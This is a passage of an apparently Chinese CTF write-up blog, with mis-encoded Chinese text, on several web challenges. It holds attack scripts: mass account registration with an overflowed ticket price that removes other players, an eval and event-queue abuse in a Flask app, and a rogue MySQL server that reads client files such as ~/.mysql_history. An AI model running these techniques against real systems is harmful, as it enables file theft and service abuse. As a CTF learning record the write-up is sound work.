class="number">1</span>: <span class="string">'21cb23b38e33426812d68991dbb6ba68'</span>,</span><br><span class="line"> <span class="number">2</span>: <span class="string">'6f89be1e66c9bd69bce99952aa009a96'</span>,</span><br><span class="line"> <span class="number">3</span>: <span class="string">'70e1b0196609646efd0aacea613943d6'</span>,</span><br><span class="line"> <span class="number">4</span>: <span class="string">'46f7f7e50b54a636f3aae60dd839590b'</span>,</span><br><span class="line"> <span class="number">5</span>: <span class="string">'395b9fb4fb0f3cf42a727d43536be457'</span>,</span><br><span class="line"> Â·Â·Â·</span><br><span class="line"> Â·Â·Â·</span><br><span class="line"> <span class="number">147</span>: <span class="string">'4cc522f84f11189d9737ab18fc22fcd0'</span>,</span><br><span class="line"> <span class="number">148</span>: <span class="string">'8f2675372aa0f2ecfee1aeeee3d814cd'</span>,</span><br><span class="line"> <span class="number">149</span>: <span class="string">'7544b9ee45ae6ae7066305d472077638'</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register_login_get_ticket</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> victiom </span><br><span class="line">    <span class="keyword">global</span> session</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        username = random.sample(string.letters, <span class="number">19</span>)    </span><br><span class="line">        username1 = <span class="string">''</span>.join(username)</span><br><span class="line">        register1 = url_seg[<span class="string">'register'</span>].format(str(username1))</span><br><span class="line">        reg_url = url + register1</span><br><span class="line">        <span class="keyword">print</span> reg_url</span><br><span class="line">        res = session.get(reg_url).content</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'\u7528\u6237\u6ce8\u518c\u6210\u529f'</span> <span class="keyword">in</span> res:</span><br><span class="line">            log_url = url + url_seg[<span class="string">'login'</span>].format(username1)</span><br><span class="line">            session.get(log_url)</span><br><span class="line">            buy_url = url + url_seg[<span class="string">'buy'</span>]</span><br><span class="line">            res = session.get(buy_url).content</span><br><span class="line">            bill_url = url + url_seg[<span class="string">'bill'</span>]</span><br><span class="line">            html = session.get(bill_url)</span><br><span class="line">            jsonn = json.loads(html.text)</span><br><span class="line">            bill_id = jsonn[<span class="string">'data'</span>][<span class="number">0</span>][<span class="string">'bill_id'</span>]</span><br><span class="line">            pay_url = url + url_seg[<span class="string">'pay'</span>].format(bill_id)</span><br><span class="line">            session.get(pay_url)</span><br><span class="line">            sear_url = url + url_seg[<span class="string">'search_ticket'</span>]</span><br><span class="line">            html = session.get(sear_url)</span><br><span class="line">            res = html.content</span><br><span class="line">            josnn = json.loads(html.text)</span><br><span class="line">            id = josnn[<span class="string">'data'</span>][<span class="number">0</span>][<span class="string">'id'</span>]</span><br><span class="line">            <span class="comment"># è¿™ä¸ªåœ°æ–¹æœ‰ç‚¹å¥‡æ€ªï¼Œjosnè§£æä¸å‡ºticketæ‰€ä»¥é‡‡ç”¨æ­£åˆ™åŒ¹é…çš„æ–¹å¼</span></span><br><span class="line">            ticket = re.search(<span class="string">"ticket\":\"(.*?)\""</span>, res).group(<span class="number">1</span>)</span><br><span class="line">            victiom[id] = ticket</span><br><span class="line">            <span class="keyword">print</span> victiom</span><br><span class="line">            <span class="keyword">if</span> len(victiom) == <span class="number">149</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_other</span><span class="params">()</span>:</span></span><br><span class="line">    session = requests.session()</span><br><span class="line">    regiter1  = url_seg[<span class="string">'register'</span>].format(<span class="string">'ch5ser_cqw_cq'</span>)</span><br><span class="line">    reg_url = url + regiter1</span><br><span class="line">    res = session.get(reg_url).content</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'\u7528\u6237\u6ce8\u518c\u6210\u529f'</span> <span class="keyword">in</span> res:</span><br><span class="line">            log_url = url + url_seg[<span class="string">'login'</span>].format(<span class="string">'ch5ser_cqw_cq'</span>)</span><br><span class="line">            session.get(log_url)</span><br><span class="line">            buy_url = url + url_seg[<span class="string">'buy'</span>]</span><br><span class="line">            res = session.get(buy_url).content</span><br><span class="line">            bill_url = url + url_seg[<span class="string">'bill'</span>]</span><br><span class="line">            html = session.get(bill_url)</span><br><span class="line">            jsonn = json.loads(html.text)</span><br><span class="line">            bill_id = jsonn[<span class="string">'data'</span>][<span class="number">0</span>][<span class="string">'bill_id'</span>]</span><br><span class="line">            pay_url = url + url_seg[<span class="string">'pay'</span>].format(bill_id)</span><br><span class="line">            session.get(pay_url)</span><br><span class="line">            sear_url = url + url_seg[<span class="string">'search_ticket'</span>]</span><br><span class="line">            html = session.get(sear_url)</span><br><span class="line">            <span class="keyword">for</span> key, value <span class="keyword">in</span> victiom.items():    </span><br><span class="line">                remove = url_seg[<span class="string">'remove'</span>].format(str(key), value)</span><br><span class="line">                rem_url = url + remove</span><br><span class="line">                <span class="keyword">print</span> session.get(rem_url).content</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> session.get(<span class="string">"http://117.51.147.155:5050/ctf/api/get_flag"</span>).content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># æ³¨å†Œè¿‡å¿«å¯èƒ½ä¼šè¢«å°</span></span><br><span class="line">    register_login_get_ticket()</span><br><span class="line">    delete_other()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>å­¦é•¿çš„è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reg</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">1000</span>):</span><br><span class="line">        url = <span class="string">"http://117.51.147.155:5050/ctf/api/register?name=cic"</span>+str(i)+<span class="string">"&amp;password=12345678"</span></span><br><span class="line">        html = requests.get(url)</span><br><span class="line">        print(html.text)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_ticket</span><span class="params">(i)</span>:</span></span><br><span class="line"></span><br><span class="line">        s = requests.session()</span><br><span class="line">        s.get(<span class="string">"http://117.51.147.155:5050/ctf/api/login?name=cic"</span>+str(i)+<span class="string">"&amp;password=12345678"</span>)</span><br><span class="line">        html = s.get(<span class="string">"http://117.51.147.155:5050/ctf/api/buy_ticket?ticket_price=4294967296"</span>)</span><br><span class="line">        json1 = json.loads(html.text)</span><br><span class="line">        ticketid = json1[<span class="string">"data"</span>][<span class="number">0</span>][<span class="string">"bill_id"</span>]</span><br><span class="line">        html1 = s.get(<span class="string">"http://117.51.147.155:5050/ctf/api/pay_ticket?bill_id="</span>+ticketid)</span><br><span class="line">        html2 = s.get(<span class="string">"http://117.51.147.155:5050/ctf/api/search_ticket"</span>)</span><br><span class="line">        json2 = json.loads(html2.text)</span><br><span class="line">        id = json2[<span class="string">"data"</span>][<span class="number">0</span>][<span class="string">"id"</span>]</span><br><span class="line">        ticket = json2[<span class="string">"data"</span>][<span class="number">0</span>][<span class="string">"ticket"</span>]</span><br><span class="line"></span><br><span class="line">        pack = &#123;<span class="string">"id"</span>:id , <span class="string">"ticket"</span>:ticket&#125;</span><br><span class="line">        <span class="keyword">return</span> pack</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">del_people</span><span class="params">(id,ticket)</span>:</span></span><br><span class="line">    s = requests.session()</span><br><span class="line">    s.get(<span class="string">"http://117.51.147.155:5050/ctf/api/login?name=cic&amp;password=12345678"</span>)</span><br><span class="line">    html = s.get(<span class="string">"http://117.51.147.155:5050/ctf/api/remove_robot?id="</span>+str(id)+<span class="string">"&amp;ticket="</span>+ticket)</span><br><span class="line">    print(html.text)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    reg()</span><br><span class="line">    <span class="comment">#get_ticket()</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">1000</span>):</span><br><span class="line">        pack = get_ticket(i)</span><br><span class="line">        id = pack[<span class="string">"id"</span>]</span><br><span class="line">        ticket = pack[<span class="string">"ticket"</span>]</span><br><span class="line">        print(id)</span><br><span class="line">        print(ticket)</span><br><span class="line">        del_people(id, ticket)</span><br><span class="line">        <span class="comment">#del_people(id,ticket)</span></span><br></pre></td></tr></table></figure>
<h2 id="æ»´">æ»´</h2>
<p>æ²™é›•é¢˜ç›®ï¼Œè¦è¯»å–çš„æ–‡ä»¶<code>.practice.txt.swp</code>åœ¨çº¿ç´¢ç½‘å€çš„ä½œè€…çš„å¦ä¸€ç¯‡åšå®¢ä¸­å‡ºç°è¿‡ï¼Œè¯»å–ï¼Œè·å¾—æºç ï¼Œä¼ é€’å¼•ç”¨å°±å¯ä»¥äº†</p>
<h2 id="å›¾ç‰‡ä¸Šä¼ ">å›¾ç‰‡ä¸Šä¼ </h2>
<p>ä¸Šä¼ ä¸€å¼ å›¾ç‰‡ï¼Œæç¤ºç¼ºå°‘å­—æ®µ<code>phpinfo()</code>,å¹¶æ˜¾ç¤ºå‡ºäº†ä¸Šä¼ åçš„å›¾ç‰‡ï¼Œä¸‹è½½åæ”¾å…¥<code>010editor</code>ä¸­æ¯”è¾ƒå‘ç°æ–‡ä»¶è¢«æ”¹åŠ¨ï¼Œæ¯”è¾ƒå‘ç°ç‰¹å®šä½ç½®ä¸Šçš„å­—èŠ‚å¹¶æ²¡æœ‰è¢«æ”¹åŠ¨ï¼Œåœ¨è¯¥ä½ç½®åé¢æ·»åŠ <code>phpinfo()</code>ä¸Šä¼ å°±æœ‰flagäº†ã€‚</p>
<h2 id="homebrew-event-loop">homebrew event loop</h2>
<p>read the source code first</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># written in python 3.7</span></span><br><span class="line">__author__ = <span class="string">'garzon'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, request, Response</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">'*********************'</span> <span class="comment"># censored</span></span><br><span class="line">url_prefix = <span class="string">'/d5af31f66741e857'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">FLAG</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'FLAG_is_here_but_i_wont_show_you'</span>  <span class="comment"># censored</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># put event in a queue</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trigger_event</span><span class="params">(event)</span>:</span></span><br><span class="line">    session[<span class="string">'log'</span>].append(event)</span><br><span class="line">    <span class="keyword">if</span> len(session[<span class="string">'log'</span>]) &gt; <span class="number">5</span>: session[<span class="string">'log'</span>] = session[<span class="string">'log'</span>][<span class="number">-5</span>:]</span><br><span class="line">    <span class="keyword">if</span> type(event) == type([]):</span><br><span class="line">        request.event_queue += event</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        request.event_queue.append(event)</span><br><span class="line"></span><br><span class="line"><span class="comment"># get the string between prefix and postfix</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_mid_str</span><span class="params">(haystack, prefix, postfix=None)</span>:</span></span><br><span class="line">    haystack = haystack[haystack.find(prefix)+len(prefix):]</span><br><span class="line">    <span class="keyword">if</span> postfix <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        haystack = haystack[:haystack.find(postfix)]</span><br><span class="line">    <span class="keyword">return</span> haystack</span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RollBackException</span>:</span> <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">execute_event_loop</span><span class="params">()</span>:</span></span><br><span class="line">    valid_event_chars = set(<span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#'</span>)</span><br><span class="line">    resp = <span class="literal">None</span></span><br><span class="line">    <span class="comment"># handle a event everytime</span></span><br><span class="line">    <span class="keyword">while</span> len(request.event_queue) &gt; <span class="number">0</span>:</span><br><span class="line">        event = request.event_queue[<span class="number">0</span>] <span class="comment"># `event` is something like "action:ACTION;ARGS0#ARGS1#ARGS2......"</span></span><br><span class="line">        request.event_queue = request.event_queue[<span class="number">1</span>:]</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> event.startswith((<span class="string">'action:'</span>, <span class="string">'func:'</span>)): <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> event:</span><br><span class="line">            <span class="keyword">if</span> c <span class="keyword">not</span> <span class="keyword">in</span> valid_event_chars: <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            is_action = event[<span class="number">0</span>] == <span class="string">'a'</span></span><br><span class="line">            action = get_mid_str(event, <span class="string">':'</span>, <span class="string">';'</span>)</span><br><span class="line">            args = get_mid_str(event, action+<span class="string">';'</span>).split(<span class="string">'#'</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="comment"># trigger_event%23;get_flag</span></span><br><span class="line">                <span class="comment"># è¿™ä¸ªåœ°æ–¹æœ‰æ„æ€ï¼Œ%23ä¹Ÿå°±æ˜¯äº•å·æ˜¯åœ¨æ‹¼æ¥ä¹‹ååœ¨evalçš„æ—¶å€™æ‰è§¦å‘çš„ï¼Œè€Œä¸æ˜¯åœ¨æ‹¼æ¥çš„æ—¶å€™ç«‹åˆ»è§¦å‘ã€‚è€Œä»ä¸‹é¢æ¥çœ‹ï¼Œä¼¼ä¹äº•å·çš„è§¦å‘èŒƒå›´ä¹Ÿå°è£…åœ¨äº†event_handleé‡Œé¢äº†ï¼Œè€Œä¸ä¼šå½±å“èŒƒå›´å¤–çš„æ‰§è¡Œã€‚</span></span><br><span class="line">                event_handler = eval(action + (<span class="string">'_handler'</span> <span class="keyword">if</span> is_action <span class="keyword">else</span> <span class="string">'_function'</span>))</span><br><span class="line">                ret_val = event_handler(args)</span><br><span class="line">            <span class="keyword">except</span> RollBackException:</span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>: resp = <span class="string">''</span></span><br><span class="line">                resp += <span class="string">'ERROR! All transactions have been cancelled. &lt;br /&gt;'</span></span><br><span class="line">                resp += <span class="string">'&lt;a href="./?action:view;index"&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">                session[<span class="string">'num_items'</span>] = request.prev_session[<span class="string">'num_items'</span>]</span><br><span class="line">                session[<span class="string">'points'</span>] = request.prev_session[<span class="string">'points'</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> Exception, e:</span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>: resp = <span class="string">''</span></span><br><span class="line">                <span class="comment">#resp += str(e) # only for debugging</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> ret_val <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>: resp = ret_val</span><br><span class="line">                <span class="keyword">else</span>: resp += ret_val</span><br><span class="line">    <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> resp == <span class="string">''</span>: resp = (<span class="string">'404 NOT FOUND'</span>, <span class="number">404</span>)</span><br><span class="line">    session.modified = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(url_prefix+'/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">entry_point</span><span class="params">()</span>:</span></span><br><span class="line">    querystring = urllib.unquote(request.query_string)</span><br><span class="line">    request.event_queue = []</span><br><span class="line">    <span class="keyword">if</span> querystring == <span class="string">''</span> <span class="keyword">or</span> (<span class="keyword">not</span> querystring.startswith(<span class="string">'action:'</span>)) <span class="keyword">or</span> len(querystring) &gt; <span class="number">100</span>:</span><br><span class="line">        querystring = <span class="string">'action:index;False#False'</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'num_items'</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">        session[<span class="string">'num_items'</span>] = <span class="number">0</span></span><br><span class="line">        session[<span class="string">'points'</span>] = <span class="number">3</span></span><br><span class="line">        session[<span class="string">'log'</span>] = []</span><br><span class="line">    request.prev_session = dict(session)</span><br><span class="line">    trigger_event(querystring)</span><br><span class="line">    <span class="keyword">return</span> execute_event_loop()</span><br><span class="line"></span><br><span class="line"><span class="comment"># handlers/functions below --------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view_handler</span><span class="params">(args)</span>:</span></span><br><span class="line">    page = args[<span class="number">0</span>]</span><br><span class="line">    html = <span class="string">''</span></span><br><span class="line">    html += <span class="string">'[INFO] you have &#123;&#125; diamonds, &#123;&#125; points now.&lt;br /&gt;'</span>.format(session[<span class="string">'num_items'</span>], session[<span class="string">'points'</span>])</span><br><span class="line">    <span class="keyword">if</span> page == <span class="string">'index'</span>:</span><br><span class="line">        html += <span class="string">'&lt;a href="./?action:index;True%23False"&gt;View source code&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">        html += <span class="string">'&lt;a href="./?action:view;shop"&gt;Go to e-shop&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">        html += <span class="string">'&lt;a href="./?action:view;reset"&gt;Reset&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">    <span class="keyword">elif</span> page == <span class="string">'shop'</span>:</span><br><span class="line">        html += <span class="string">'&lt;a href="./?action:buy;1"&gt;Buy a diamond (1 point)&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">    <span class="keyword">elif</span> page == <span class="string">'reset'</span>:</span><br><span class="line">        <span class="keyword">del</span> session[<span class="string">'num_items'</span>]</span><br><span class="line">        html += <span class="string">'Session reset.&lt;br /&gt;'</span></span><br><span class="line">    html += <span class="string">'&lt;a href="./?action:view;index"&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">    <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index_handler</span><span class="params">(args)</span>:</span></span><br><span class="line">    bool_show_source = str(args[<span class="number">0</span>])</span><br><span class="line">    bool_download_source = str(args[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">if</span> bool_show_source == <span class="string">'True'</span>:</span><br><span class="line">    </span><br><span class="line">        source = open(<span class="string">'eventLoop.py'</span>, <span class="string">'r'</span>)</span><br><span class="line">        html = <span class="string">''</span></span><br><span class="line">        <span class="keyword">if</span> bool_download_source != <span class="string">'True'</span>:</span><br><span class="line">            html += <span class="string">'&lt;a href="./?action:index;True%23True"&gt;Download this .py file&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">            html += <span class="string">'&lt;a href="./?action:view;index"&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">            </span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> source:</span><br><span class="line">            <span class="keyword">if</span> bool_download_source != <span class="string">'True'</span>:</span><br><span class="line">                html += line.replace(<span class="string">'&amp;'</span>,<span class="string">'&amp;amp;'</span>).replace(<span class="string">'\t'</span>, <span class="string">'&amp;nbsp;'</span>*<span class="number">4</span>).replace(<span class="string">' '</span>,<span class="string">'&amp;nbsp;'</span>).replace(<span class="string">'&lt;'</span>, <span class="string">'&amp;lt;'</span>).replace(<span class="string">'&gt;'</span>,<span class="string">'&amp;gt;'</span>).replace(<span class="string">'\n'</span>, <span class="string">'&lt;br /&gt;'</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                html += line</span><br><span class="line">        source.close()</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> bool_download_source == <span class="string">'True'</span>:</span><br><span class="line">            headers = &#123;&#125;</span><br><span class="line">            headers[<span class="string">'Content-Type'</span>] = <span class="string">'text/plain'</span></span><br><span class="line">            headers[<span class="string">'Content-Disposition'</span>] = <span class="string">'attachment; filename=serve.py'</span></span><br><span class="line">            <span class="keyword">return</span> Response(html, headers=headers)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> html</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        trigger_event(<span class="string">'action:view;index'</span>)</span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buy_handler</span><span class="params">(args)</span>:</span></span><br><span class="line">    num_items = int(args[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">if</span> num_items &lt;= <span class="number">0</span>: <span class="keyword">return</span> <span class="string">'invalid number(&#123;&#125;) of diamonds to buy&lt;br /&gt;'</span>.format(args[<span class="number">0</span>])</span><br><span class="line">    session[<span class="string">'num_items'</span>] += num_items </span><br><span class="line">    trigger_event([<span class="string">'func:consume_point;&#123;&#125;'</span>.format(num_items), <span class="string">'action:view;index'</span>])</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">consume_point_function</span><span class="params">(args)</span>:</span></span><br><span class="line">    point_to_consume = int(args[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">'points'</span>] &lt; point_to_consume: <span class="keyword">raise</span> RollBackException()</span><br><span class="line">    session[<span class="string">'points'</span>] -= point_to_consume</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_flag_function</span><span class="params">(args)</span>:</span></span><br><span class="line">    flag = args[<span class="number">0</span>]</span><br><span class="line">    <span class="comment">#return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it.</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'You naughty boy! ;) &lt;br /&gt;'</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag_handler</span><span class="params">(args)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">'num_items'</span>] &gt;= <span class="number">5</span>:</span><br><span class="line">        trigger_event(<span class="string">'func:show_flag;'</span> + FLAG()) <span class="comment"># show_flag_function has been disabled, no worries</span></span><br><span class="line">    trigger_event(<span class="string">'action:view;index'</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(debug=<span class="literal">False</span>, host=<span class="string">'0.0.0.0'</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://user-images.githubusercontent.com/40637063/56887796-12dafb80-6aa5-11e9-9181-aae6b45ea0ca.png" alt="Screenshot from 2019-04-29 17-29-27"></p>
<p><img src="https://user-images.githubusercontent.com/40637063/56887798-140c2880-6aa5-11e9-8fcf-44b7353af4da.png" alt="Screenshot from 2019-04-29 17-28-05"></p>
<p><img src="https://user-images.githubusercontent.com/40637063/56887802-14a4bf00-6aa5-11e9-853d-48cdb2ae8df4.png" alt="Screenshot from 2019-04-29 17-28-36"></p>
<p>è¿™é‡Œæœ‰ä¸ªç‚¹æœ‰ç–‘é—®ï¼š</p>
<ul>
<li>ä¸ºä»€ä¹ˆ<code>get_flag_handle</code>å‡½æ•°å¯ä»¥åœ¨æ²¡æœ‰å‚æ•°çš„æƒ…å†µä¸‹è¿è¡Œï¼Ÿæ¯•ç«Ÿä»–ç”³æ˜çš„æ—¶å€™æ˜¯æœ‰å‚æ•°çš„ã€‚</li>
</ul>
<p>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œ<code>get_flag_handle</code> å’Œ <code>buy</code>å‡½æ•°æ˜¯åœ¨<code>consume_point_function</code>æ‰§è¡Œä¹‹å‰è¢«æ‰§è¡Œçš„ï¼Œè¿™ä¸ªå‡½æ•°ä¼šæ£€æŸ¥æˆ‘ä»¬æ˜¯å¦æœ‰è¶³å¤Ÿçš„é’»çŸ³ï¼Œå¦‚æœæ²¡æœ‰å°±å›æ»šã€‚ç„¶è€Œï¼Œæ•´ä¸ªæµç¨‹æ˜¯é€šè¿‡é˜Ÿåˆ—æ¥æ§åˆ¶çš„ï¼Œè¿™æ„å‘³ç€å¦‚æœæˆ‘ä»¬å°†<code>buy</code>å’Œ<code>get_flag</code>å‡½æ•°æ’å…¥åœ¨<code>consume_point_function</code>å‰é¢çš„è¯ï¼Œä»–ä»¬ä¼šå…ˆæ‰§è¡Œå¹¶è·å–åˆ°<code>flag</code>ï¼Œ æ³¨æ„åˆ°<code>trigger_event</code>ä¼šå°†flagæ”¾è¿›<code>log</code>ä¹‹ä¸­å»å¹¶æ”¾åœ¨<code>session</code>ä¸­æ˜¾ç¤ºå›æ¥ã€‚</p>
<h2 id="mysqlå¼±å£ä»¤">mysqlå¼±å£ä»¤</h2>
<p><img src="https://user-images.githubusercontent.com/40637063/57570602-6d297400-7436-11e9-9cfe-720761c4b08f.png" alt="QQæˆªå›¾20190511214737"></p>
<p>å®¢æˆ·ç«¯è®¿é—®æœåŠ¡ç«¯æ—¶ï¼ŒæœåŠ¡ç«¯å¯ä»¥å‘å®¢æˆ·ç«¯å‘é€è¯·æ±‚å¹¶ä¸”å®ç°ä»»æ„æ–‡ä»¶è¯»å–ã€‚</p>
<p>é¢˜ç›®ä¸­çš„è„šæœ¬ç›®çš„æ˜¯æ£€æµ‹æ˜¯å¦å¼€å¯äº†mysqlæœåŠ¡ï¼Œæ‰€ä»¥å¯ä»¥å°†å›æ˜¾çš„ä¸œè¥¿è®¾ç½®ä¸º <code>result = [{'local_address':&quot;0.0.0.0:3306&quot;,'Process_name':&quot;1234/mysqld&quot;}]</code>ï¼Œè¿™æ ·å°±å¯ä»¥ç»•è¿‡å®¢æˆ·ç«¯çš„éªŒè¯äº†ã€‚</p>
<p>ç„¶åä¼ªé€ ä¸€ä¸ªmysqlå®¢æˆ·ç«¯ã€‚åŒ…æ‹¬ä¸‰éƒ¨åˆ†ï¼šä¼ªé€ greetingåŒ…ï¼Œä¼ªé€ ç™»å½•æˆåŠŸåŒ…ï¼Œä¼ªé€ æ–‡ä»¶å“åº”åŒ…ã€‚<br>
è„šæœ¬å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">host = <span class="string">'0.0.0.0'</span></span><br><span class="line">port = <span class="number">3306</span></span><br><span class="line"></span><br><span class="line">server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">server.bind((host,port))</span><br><span class="line"></span><br><span class="line">server.listen(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># filename = '/etc/passwd'</span></span><br><span class="line">filename = <span class="string">'~/.mysql_history'</span></span><br><span class="line"></span><br><span class="line">greeting = <span class="string">"5b0000000a352e372e32362d307562756e7475302e31392e30342e31000c0000001c2a785a183c1a6200fff7080200ff811500000000000000000000336b72452b23601d7c206856006d7973716c5f6e61746976655f70617373776f726400"</span>.decode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line">login_conf = <span class="string">"0700000200000002000000"</span>.decode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿™é‡Œçš„chrå€¼å¾—æ³¨æ„</span></span><br><span class="line">evil_request = chr(len(filename) + <span class="number">1</span>)+<span class="string">"\x00\x00\x01\xfb"</span>+filename</span><br><span class="line"></span><br><span class="line">conn, addr = server.accept()</span><br><span class="line">conn.send(greeting)</span><br><span class="line"><span class="keyword">print</span> conn.recv(<span class="number">9999</span>)</span><br><span class="line">conn.send(login_conf)</span><br><span class="line"><span class="keyword">print</span> conn.recv(<span class="number">9999</span>)</span><br><span class="line">conn.send(evil_request)</span><br><span class="line"><span class="keyword">print</span> conn.recv(<span class="number">9999</span>)</span><br></pre></td></tr></table></figure>
<p>ä¸‰ä¸ªå‘é€çš„ä¸œè¥¿åˆ†åˆ«å¯¹åº”å¦‚ä¸‹ï¼š</p>
<ul>
<li>greeting</li>
</ul>
<p><img src="https://user-images.githubusercontent.com/40637063/57570552-ebd1e180-7435-11e9-9c95-fed585cdd3a2.png" alt="Screenshot from 2019-05-11 15-31-17"></p>
<ul>
<li>
<p>ç™»å½•é€šè¿‡åŒ…</p>
<p><img src="https://user-images.githubusercontent.com/40637063/57570520-7e25b580-7435-11e9-988e-f68b0f04317e.png" alt="Screenshot from 2019-05-11 15-35-00"></p>
</li>
<li>
<p>æ–‡ä»¶å›æ˜¾åŒ…</p>
</li>
</ul>
<p><img src="https://user-images.githubusercontent.com/40637063/57570547-d8267b00-7435-11e9-9551-fb9ef384c7fd.png" alt="Screenshot from 2019-05-11 15-49-14"></p>
